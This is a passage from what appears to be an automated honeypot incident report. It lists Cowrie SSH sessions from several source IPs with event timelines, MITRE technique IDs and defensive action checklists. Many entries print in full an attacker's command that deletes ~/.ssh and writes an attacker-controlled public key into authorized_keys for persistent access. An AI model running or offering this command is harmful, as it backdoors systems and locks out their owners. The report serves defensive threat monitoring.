| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:38:42` | `cowrie.session.connect` |
| `2026-05-26 04:38:42` | `cowrie.client.version` |
| `2026-05-26 04:38:42` | `cowrie.client.kex` |
| `2026-05-26 04:38:42` | `cowrie.login.success` |
| `2026-05-26 04:38:42` | `cowrie.session.params` |
| `2026-05-26 04:38:42` | `cowrie.command.input` |
| `2026-05-26 04:38:42` | `cowrie.command.failed` |
| `2026-05-26 04:38:43` | `cowrie.log.closed` |
| `2026-05-26 04:38:43` | `cowrie.session.params` |
| `2026-05-26 04:38:43` | `cowrie.command.input` |
| `2026-05-26 04:38:43` | `cowrie.session.file_download` |
| `2026-05-26 04:38:43` | `cowrie.log.closed` |
| `2026-05-26 04:38:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.186[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.186[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a5d10d9e96f

| Field | Detail |
|---|---|
| **Source IP** | `183.91.186[.]36` |
| **First Seen** | 2026-05-26 04:38 |
| **Last Seen** | 2026-05-26 04:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:38:45` | `cowrie.session.connect` |
| `2026-05-26 04:38:45` | `cowrie.client.version` |
| `2026-05-26 04:38:45` | `cowrie.client.kex` |
| `2026-05-26 04:38:45` | `cowrie.login.success` |
| `2026-05-26 04:38:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.186[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.186[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93a9db5ae577

| Field | Detail |
|---|---|
| **Source IP** | `180.76.184[.]79` |
| **First Seen** | 2026-05-26 04:42 |
| **Last Seen** | 2026-05-26 04:43 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:42:53` | `cowrie.session.connect` |
| `2026-05-26 04:42:53` | `cowrie.client.version` |
| `2026-05-26 04:42:53` | `cowrie.client.kex` |
| `2026-05-26 04:42:54` | `cowrie.login.success` |
| `2026-05-26 04:42:58` | `cowrie.session.params` |
| `2026-05-26 04:42:58` | `cowrie.command.input` |
| `2026-05-26 04:42:58` | `cowrie.command.failed` |
| `2026-05-26 04:43:03` | `cowrie.log.closed` |
| `2026-05-26 04:43:04` | `cowrie.session.params` |
| `2026-05-26 04:43:04` | `cowrie.command.input` |
| `2026-05-26 04:43:05` | `cowrie.session.file_download` |
| `2026-05-26 04:43:05` | `cowrie.log.closed` |
| `2026-05-26 04:43:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.184[.]79` to AbuseIPDB if not already reported
- [ ] Block `180.76.184[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-186b40f85159

| Field | Detail |
|---|---|
| **Source IP** | `180.76.184[.]79` |
| **First Seen** | 2026-05-26 04:43 |
| **Last Seen** | 2026-05-26 04:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:43:14` | `cowrie.session.connect` |
| `2026-05-26 04:43:14` | `cowrie.client.version` |
| `2026-05-26 04:43:15` | `cowrie.client.kex` |
| `2026-05-26 04:43:19` | `cowrie.login.success` |
| `2026-05-26 04:43:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.184[.]79` to AbuseIPDB if not already reported
- [ ] Block `180.76.184[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d72ce2904df0

| Field | Detail |
|---|---|
| **Source IP** | `113.141.171[.]139` |
| **First Seen** | 2026-05-26 04:46 |
| **Last Seen** | 2026-05-26 04:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:46:42` | `cowrie.session.connect` |
| `2026-05-26 04:46:42` | `cowrie.client.version` |
| `2026-05-26 04:46:42` | `cowrie.client.kex` |
| `2026-05-26 04:46:43` | `cowrie.login.success` |
| `2026-05-26 04:46:43` | `cowrie.session.params` |
| `2026-05-26 04:46:43` | `cowrie.command.input` |
| `2026-05-26 04:46:43` | `cowrie.command.failed` |
| `2026-05-26 04:46:43` | `cowrie.log.closed` |
| `2026-05-26 04:46:44` | `cowrie.session.params` |
| `2026-05-26 04:46:44` | `cowrie.command.input` |
| `2026-05-26 04:46:44` | `cowrie.session.file_download` |
| `2026-05-26 04:46:44` | `cowrie.log.closed` |
| `2026-05-26 04:46:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.141.171[.]139` to AbuseIPDB if not already reported
- [ ] Block `113.141.171[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f76ba976f212

| Field | Detail |
|---|---|
| **Source IP** | `183.91.186[.]36` |
| **First Seen** | 2026-05-26 04:46 |
| **Last Seen** | 2026-05-26 04:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:46:44` | `cowrie.session.connect` |
| `2026-05-26 04:46:45` | `cowrie.client.version` |
| `2026-05-26 04:46:45` | `cowrie.client.kex` |
| `2026-05-26 04:46:45` | `cowrie.login.success` |
| `2026-05-26 04:46:45` | `cowrie.session.params` |
| `2026-05-26 04:46:45` | `cowrie.command.input` |
| `2026-05-26 04:46:45` | `cowrie.command.failed` |
| `2026-05-26 04:46:46` | `cowrie.log.closed` |
| `2026-05-26 04:46:46` | `cowrie.session.params` |
| `2026-05-26 04:46:46` | `cowrie.command.input` |
| `2026-05-26 04:46:46` | `cowrie.session.file_download` |
| `2026-05-26 04:46:46` | `cowrie.log.closed` |
| `2026-05-26 04:46:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.186[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.186[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9f21fb902eb

| Field | Detail |
|---|---|
| **Source IP** | `113.141.171[.]139` |
| **First Seen** | 2026-05-26 04:46 |
| **Last Seen** | 2026-05-26 04:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:46:46` | `cowrie.session.connect` |
| `2026-05-26 04:46:46` | `cowrie.client.version` |
| `2026-05-26 04:46:46` | `cowrie.client.kex` |
| `2026-05-26 04:46:47` | `cowrie.login.success` |
| `2026-05-26 04:46:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.141.171[.]139` to AbuseIPDB if not already reported
- [ ] Block `113.141.171[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3019b0deeee

| Field | Detail |
|---|---|
| **Source IP** | `183.91.186[.]36` |
| **First Seen** | 2026-05-26 04:46 |
| **Last Seen** | 2026-05-26 04:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:46:50` | `cowrie.session.connect` |
| `2026-05-26 04:46:50` | `cowrie.client.version` |
| `2026-05-26 04:46:50` | `cowrie.client.kex` |
| `2026-05-26 04:46:52` | `cowrie.login.success` |
| `2026-05-26 04:46:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.186[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.186[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12edfa846ca0

| Field | Detail |
|---|---|
| **Source IP** | `113.141.171[.]139` |
| **First Seen** | 2026-05-26 04:47 |
| **Last Seen** | 2026-05-26 04:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:47:27` | `cowrie.session.connect` |
| `2026-05-26 04:47:27` | `cowrie.client.version` |
| `2026-05-26 04:47:27` | `cowrie.client.kex` |
| `2026-05-26 04:47:28` | `cowrie.login.success` |
| `2026-05-26 04:47:28` | `cowrie.session.params` |
| `2026-05-26 04:47:28` | `cowrie.command.input` |
| `2026-05-26 04:47:28` | `cowrie.command.failed` |
| `2026-05-26 04:47:28` | `cowrie.log.closed` |
| `2026-05-26 04:47:29` | `cowrie.session.params` |
| `2026-05-26 04:47:29` | `cowrie.command.input` |
| `2026-05-26 04:47:29` | `cowrie.session.file_download` |
| `2026-05-26 04:47:29` | `cowrie.log.closed` |
| `2026-05-26 04:47:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.141.171[.]139` to AbuseIPDB if not already reported
- [ ] Block `113.141.171[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-775fd4fb3d5a

| Field | Detail |
|---|---|
| **Source IP** | `113.141.171[.]139` |
| **First Seen** | 2026-05-26 04:47 |
| **Last Seen** | 2026-05-26 04:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:47:31` | `cowrie.session.connect` |
| `2026-05-26 04:47:31` | `cowrie.client.version` |
| `2026-05-26 04:47:31` | `cowrie.client.kex` |
| `2026-05-26 04:47:32` | `cowrie.login.success` |
| `2026-05-26 04:47:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.141.171[.]139` to AbuseIPDB if not already reported
- [ ] Block `113.141.171[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5871d4919b2b

| Field | Detail |
|---|---|
| **Source IP** | `183.91.186[.]36` |
| **First Seen** | 2026-05-26 04:48 |
| **Last Seen** | 2026-05-26 04:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:48:12` | `cowrie.session.connect` |
| `2026-05-26 04:48:13` | `cowrie.client.version` |
| `2026-05-26 04:48:13` | `cowrie.client.kex` |
| `2026-05-26 04:48:14` | `cowrie.login.success` |
| `2026-05-26 04:48:15` | `cowrie.session.params` |
| `2026-05-26 04:48:15` | `cowrie.command.input` |
| `2026-05-26 04:48:15` | `cowrie.command.failed` |
| `2026-05-26 04:48:16` | `cowrie.log.closed` |
| `2026-05-26 04:48:16` | `cowrie.session.params` |
| `2026-05-26 04:48:16` | `cowrie.command.input` |
| `2026-05-26 04:48:16` | `cowrie.session.file_download` |
| `2026-05-26 04:48:16` | `cowrie.log.closed` |
| `2026-05-26 04:48:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.186[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.186[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcc093a49d0b

| Field | Detail |
|---|---|
| **Source IP** | `183.91.186[.]36` |
| **First Seen** | 2026-05-26 04:48 |
| **Last Seen** | 2026-05-26 04:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:48:18` | `cowrie.session.connect` |
| `2026-05-26 04:48:18` | `cowrie.client.version` |
| `2026-05-26 04:48:18` | `cowrie.client.kex` |
| `2026-05-26 04:48:19` | `cowrie.login.success` |
| `2026-05-26 04:48:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.186[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.186[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70c26fdad535

| Field | Detail |
|---|---|
| **Source IP** | `113.141.171[.]139` |
| **First Seen** | 2026-05-26 04:49 |
| **Last Seen** | 2026-05-26 04:49 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:49:05` | `cowrie.session.connect` |
| `2026-05-26 04:49:05` | `cowrie.client.version` |
| `2026-05-26 04:49:05` | `cowrie.client.kex` |
| `2026-05-26 04:49:05` | `cowrie.login.success` |
| `2026-05-26 04:49:06` | `cowrie.session.params` |
| `2026-05-26 04:49:06` | `cowrie.command.input` |
| `2026-05-26 04:49:06` | `cowrie.command.failed` |
| `2026-05-26 04:49:06` | `cowrie.log.closed` |
| `2026-05-26 04:49:06` | `cowrie.session.params` |
| `2026-05-26 04:49:06` | `cowrie.command.input` |
| `2026-05-26 04:49:06` | `cowrie.session.file_download` |
| `2026-05-26 04:49:06` | `cowrie.log.closed` |
| `2026-05-26 04:49:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.141.171[.]139` to AbuseIPDB if not already reported
- [ ] Block `113.141.171[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cff8f082e41

| Field | Detail |
|---|---|
| **Source IP** | `113.141.171[.]139` |
| **First Seen** | 2026-05-26 04:49 |
| **Last Seen** | 2026-05-26 04:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:49:09` | `cowrie.session.connect` |
| `2026-05-26 04:49:09` | `cowrie.client.version` |
| `2026-05-26 04:49:09` | `cowrie.client.kex` |
| `2026-05-26 04:49:09` | `cowrie.login.success` |
| `2026-05-26 04:49:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.141.171[.]139` to AbuseIPDB if not already reported
- [ ] Block `113.141.171[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52a00b684878

| Field | Detail |
|---|---|
| **Source IP** | `113.141.171[.]139` |
| **First Seen** | 2026-05-26 04:49 |
| **Last Seen** | 2026-05-26 04:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:49:51` | `cowrie.session.connect` |
| `2026-05-26 04:49:51` | `cowrie.client.version` |
| `2026-05-26 04:49:52` | `cowrie.client.kex` |
| `2026-05-26 04:49:52` | `cowrie.login.success` |
| `2026-05-26 04:49:53` | `cowrie.session.params` |
| `2026-05-26 04:49:53` | `cowrie.command.input` |
| `2026-05-26 04:49:53` | `cowrie.command.failed` |
| `2026-05-26 04:49:53` | `cowrie.log.closed` |
| `2026-05-26 04:49:53` | `cowrie.session.params` |
| `2026-05-26 04:49:53` | `cowrie.command.input` |
| `2026-05-26 04:49:53` | `cowrie.session.file_download` |
| `2026-05-26 04:49:53` | `cowrie.log.closed` |
| `2026-05-26 04:49:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.141.171[.]139` to AbuseIPDB if not already reported
- [ ] Block `113.141.171[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f649e570812

| Field | Detail |
|---|---|
| **Source IP** | `113.141.171[.]139` |
| **First Seen** | 2026-05-26 04:49 |
| **Last Seen** | 2026-05-26 04:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:49:55` | `cowrie.session.connect` |
| `2026-05-26 04:49:55` | `cowrie.client.version` |
| `2026-05-26 04:49:56` | `cowrie.client.kex` |
| `2026-05-26 04:49:56` | `cowrie.login.success` |
| `2026-05-26 04:49:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.141.171[.]139` to AbuseIPDB if not already reported
- [ ] Block `113.141.171[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fda6e45ef103

| Field | Detail |
|---|---|
| **Source IP** | `113.141.171[.]139` |
| **First Seen** | 2026-05-26 04:50 |
| **Last Seen** | 2026-05-26 04:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 04:50:13` | `cowrie.session.connect` |
| `2026-05-26 04:50:13` | `cowrie.client.version` |
| `2026-05-26 04:50:14` | `cowrie.client.kex` |
| `2026-05-26 04:50:14` | `cowrie.login.success` |
| `2026-05-26 04:50:14` | `cowrie.session.params` |
| `2026-05-26 04:50:14` | `cowrie.command.input` |
